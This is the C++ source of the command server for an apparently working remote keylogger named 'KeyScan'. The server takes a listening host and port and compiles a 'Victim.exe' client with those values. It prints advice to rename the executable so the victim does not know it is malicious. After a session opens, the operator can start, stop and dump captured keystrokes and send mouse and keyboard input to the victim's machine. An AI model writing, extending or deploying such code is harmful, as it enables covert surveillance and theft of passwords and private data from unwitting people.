#include "server/main.hpp"

using namespace std;

int main() {
	
	printDefault();
	char cmd[4078];
	while(1) {
		memset(cmd, 0, sizeof(cmd));
	#if defined(_WIN32)
		cout << "KeyScan@" << cliIP << "~$ ";
	#else 
		cout << blu << "┌──(" << gre << "KeyScan" << blu << ")-[~" << cliIP << "]\n";
		cout << "└─$ " << res;
	#endif	
		cin.getline(cmd, sizeof(cmd));
		ExecuteCommand(cmd);
		
		
	}
}

void printDefault() {
	cout << "`_`  `_`_____``_````_``_____` `____```_____` `__  `_``  \n";
	cout << "|`| /`/| `___|\\ \\  / /|  ___| | `__| |  _  | | |\\ | |   \n";
	cout << "| |/ / | |___  \\ \\/ / | |___  | |    | |_| | | | \\| |   \n";
	cout << "|   /  |  ___|  \\  /  |____ | | |    |     | | |\\   |   \n";
	cout << "| |\\ \\ | |___`   | |   ___| | | |__  |  _  | | | \\  |   \n";
	cout << "|_| \\_\\|_____|   |_|  |_____| |____| |_| |_| |_|  \\_|   \n";
	cout << "           Created by: Anonymous Hacks(4anonz)\n";
	cout << "           Github: https://github.com/4anonz\n";
	cout << "           Version: 0.0.1\n\n\n";
}
	

void printHelp() {
	const char *helpMsg = "\n"
	"SETTING OPTIONS: Set this options before lauching the attack!\n"
	"Command                           Discribtion\n"
	"-------                           ------------\n"
	"lhost                              Sets the local host or ip address to listen on.\n"
	"lport                              Sets the local port number to listen on. default 4444\n"
	"exploit                            Run the script.\n"
	"install-cmd                        Get the commands of installing mingw-w64 on termux and linux\n"
	"help                               Print this help message\n"
	"clear                              Clear screen\n"
	"exit                               Exit program\n"
	"\n"
	"SESSION COMMANDS: This commands are only valid when a session is opened\n"
	"LOGGING KEYSTROKES:\n"
	"====================\n"
	"keyscan_start                      Start capturing keystrokes\n"
	"keyscan_dump                       Dump the captured keystrokes buffer.\n"
	"keyscan_stop                       Stop capturing keystrokes.\n\n"
	"SENDING MOUSE EVENTS:\n"
	"=====================\n"
	"mouse_move x y                     Move the mouse to x and y coordinates. The value range of x and y is 0-65535\n"
	"mouse_click left                   Left click\n"
	"mouse_click right                  Right click\n"
	"mouse_click middle                 Click the middle mouse button\n"
	"mouse_click double                 Double click the left mouse button\n\n"
	"SENDING KEYBOARD EVENTS:\n"
	"========================\n"
	"keyboard_send                      Send keystrokes. This must be followed by the keys(or text) you want to send\n"
	"keyevent                           Send keyboard events. like CTRL+C, ALT+F4.\n"
	"                                   you must use the '+' sign to indicate that the keys should be press together.\n"
	"                                   for a single key just type the key name example 'keyevent SHIFT' to press the shift key.\n\n"
	"Supported keyevents:\n"
	"A-Z, F1-F12, SHIFT, ENTER, SPACE, BACKSPACE, ALT, ESC, PAGEUP, PAGEDOWN, HOME, LEFTARROW, RIGHTARROW, UPARROW\n"
	"DOWNARROW, PRINTSCRN, INSERT, DELETE, CAPS\n"
	"These values are case sensetive. You must use them in upper case except for A-Z(you can use them in upper or lower case).\n"
	"EXAMPLES:\n"
	"\tkeyboard_send You have been hacked!\n"
	"\tkeyevent CTRL+c\n"
	"\tkeyevent ALT+F4\n"
	"\tkeyevent ENTER\n" 
	"\tmouse_move 2345 345\n"
	"\tmouse_click right";
	
	cout << helpMsg << endl;
}

void ExecuteCommand(char * cmd) {
	char *p;
	if(strcmp(cmd, "help") == 0)
		printHelp();
	else if(strstr(cmd, "lhost")) {
		p = strstr(cmd, "lhost");
		while(*p && *p != ' ') *p++;
		if(*p == ' ')
			*p++ = 0;
		strcpy(lhost, p);
		cout << "lhost ==> " << lhost << endl;
	}else if(strstr(cmd, "lport")) {
		p = strstr(cmd, "lport");
		while(*p && *p != ' ') *p++;
		if(*p == ' ')
			*p++ = 0;
		strcpy(lport, p);
		cout << "lport ==> " << lport << endl;
	}else if(strcmp(cmd, "exploit") == 0) {
		if(strlen(lhost) < 1)
			cout << red << "[-]"<< res << " Please specify the lhost\n";
		else {
			if(editFile(lhost, lport) == 0) {
		#if defined(_WIN32)
				WSADATA d;
				WSAStartup(MAKEWORD(2, 2), &d);
		#endif
				srvSocket = startServer(lhost, lport);
				if(srvSocket != -1) {
					cout << blu << "[*]" << res << " Server started Listening on " << lhost << ":" << lport << endl;
				
					isServerStarted = true;
					struct sockaddr_storage cliAddr;
					socklen_t cliAddrlen = sizeof(cliAddr);
					while((cliSocket = accept(srvSocket, reinterpret_cast<struct sockaddr*>(&cliAddr),
										&cliAddrlen))) {
						const clock_t startTime = clock();
						while(1) {
							
							if ((clock() - startTime) / CLOCKS_PER_SEC > TIMEOUT)
								break;
							fd_set reads;
							reads = waitOnClient(cliSocket);
							if(FD_ISSET(cliSocket, &reads)) {
								char data[200];
								recv(cliSocket, data, sizeof(data), 0);
								if(strstr(data, "KeyScan Session")) {
									getnameinfo(reinterpret_cast<struct sockaddr*>(&cliAddr),
										cliAddrlen, cliIP, 100, cliSrv, 100, 
										NI_NUMERICHOST);
										
									cout << blu << "[*]" << res <<  " Session opened for " << cliIP << ":" << cliSrv << endl;
									isSession = true;
									break;
								}else
									break;
							}
						}
						if(!isSession)
							CloseSocket(cliSocket);
						else
							break;
					}
					
				} else {
					cout << red << "[-]" << res << " Error: ";
					cout << GetErrorMsg() << endl;
					CloseSocket(srvSocket);
				}
			}
		}
		
	}else if((strcmp(cmd, "keyscan_start") == 0) || (strcmp(cmd, "keyscan_stop") == 0)||
			 (strcmp(cmd, "keyscan_dump") == 0) || strstr(cmd, "mouse_move") ||
			 strstr(cmd, "mouse_click right") || strstr(cmd, "mouse_click left") ||
			 strstr(cmd, "mouse_click middle") || strstr(cmd, "mouse_click double") ||
			 strstr(cmd, "keyboard_send") || strstr(cmd, "keyevent")) {
		if(!isSession) {
			cout << red << "[-]" << res << " Error: No active session\n";
		}else {
			bytesSent = SendData(cliSocket, cmd);
			if(bytesSent < 1) {
				cout << blu << "[-]" << res << " Session closed, Reason: Target disconnected\n";
				memset(cliIP, 0, sizeof(cliIP));
				CloseSocket(srvSocket); 
			} else 
				cout << blu << "[*] " << res << getResponse(cliSocket) << endl;
		}
	}else if(strcmp(cmd, "clear") == 0) {
	#if defined(_WIN32)
		system("cls");
	#else
		system("clear");
	#endif
	}else if(strcmp(cmd, "exit") == 0) {
		CloseSocket(cliSocket);
		CloseSocket(srvSocket);
		exit(0);
	} else if(strcmp(cmd, "install_cmd") == 0) {
		cout << "Install mingw-w64 on linux using:\n";
		cout << "sudo apt-get install mingw-w64\n\n";
		cout << "Install on termux using:\n";
		cout << "git clone https://github.com/mirror/mingw-w64.git\n";
		cout << "cd mingw-w64\n";
		cout << "./configure --prefix=$PREFIX --without-crt\n";
		cout << "DESTDIR=$PREFIX make install\n\n";
	} else if(strlen(cmd) < 1);
	 else
		cout << "Unknown command " << red << cmd << res << endl;

}

/**
 * Do NOT edit this function!!
 * It is used by the program to edit the keyscan.cpp file and change the hostname
 * and port number to the one provided by the user.. Editing this may cause the progam
 * NOT WORK unless you know what you're doing..
 * */
int editFile(std::string lhost, std::string lport) {
	fstream keyscanFile, tmpFile;
	
	keyscanFile.open("keyscan/keyscan.cpp", ios::in);
	tmpFile.open("keyscan/tmp.cpp", ios::out);
	
	string hostLine = "char hostname[100] = \"127.0.0.1\";";
	string portLine = "char port[20] = \"4444\";";
	
	string newLine1 = "char hostname[100] = \"" + lhost + "\";";
	string newLine2 = "char port[20] = \""+ lport + "\";";
	
	string line;
	while(getline(keyscanFile, line)) {
		if(line == hostLine)
			tmpFile << newLine1 << endl;
		else if(line == portLine)
			tmpFile << newLine2 << endl;
		else
			tmpFile << line << endl;
	}
	keyscanFile.close();
	tmpFile.close();
	int code;
#if defined(_WIN32)
	code = system("g++ keyscan/tmp.cpp -o keyscan/Victim.exe -lws2_32");
#else
	code = system("i686-w64-mingw32-g++ keyscan/tmp.cpp -lws2_32 -static-libgcc -static-libstdc++ -o keyscan/Victim.exe");
#endif
	if(code == 0) {
		cout << "The keyscan/Victim.exe file has to be send to the victim\n";
		cout << "Plase consider renaming the file so the victim don't know it's malicious😎️😉️\n";
	} else {
	#if defined(_WIN32)
		cout << "Make sure you have MingWG installed\n";
	#else
		cout << "Please use the 'install_cmd' to get the commads of installing mingw on linux and termux before you continue\n";
	#endif
		return -1;
	}
	remove("keyscan/tmp.cpp");
	return 0;
}
